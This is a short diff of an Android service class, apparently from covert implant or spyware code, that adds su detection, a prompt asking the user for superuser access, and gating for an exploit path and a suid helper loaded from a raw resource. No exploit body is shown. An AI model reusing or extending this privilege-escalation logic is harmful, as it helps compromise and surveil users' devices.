@@ -124,16 +124,23 @@ public class ServiceCore extends Service {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
 		}
 
-		if (PackageInfo.checkRoot() == true) {
-			Status.self().setRoot(true);
-		} else {
-			Status.self().setRoot(false);
+		// Abbiamo su?
+		Status.self().setSu(PackageInfo.hasSu());
+		
+		// Abbiamo la root?
+		Status.self().setRoot(PackageInfo.checkRoot());
+
+		if (Status.self().haveSu() == true) {
+			// Ask the user...
+			superapkRoot();
+
+			boolean isRoot = PackageInfo.checkRoot();
 		}
-
+		
 		if (Cfg.EXP) {
-			boolean isRoot = false;
+			boolean isRoot = Status.self().haveRoot();
 
-			if (PackageInfo.checkRoot() == false) {
+			if (isRoot == false) {
 				// Don't exploit if we have no SD card mounted
 				if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
 					// isRoot = root();
@@ -418,6 +425,10 @@ public class ServiceCore extends Service {
 		final String suidext = Messages.getString("32.6"); // statusdb
 		boolean isRoot = PackageInfo.checkRoot();
 
+		if (Status.self().haveSu() == false) {
+			return false;
+		}
+		
 		Resources resources = getResources();
 		InputStream stream = resources.openRawResource(R.raw.statuslog);
 
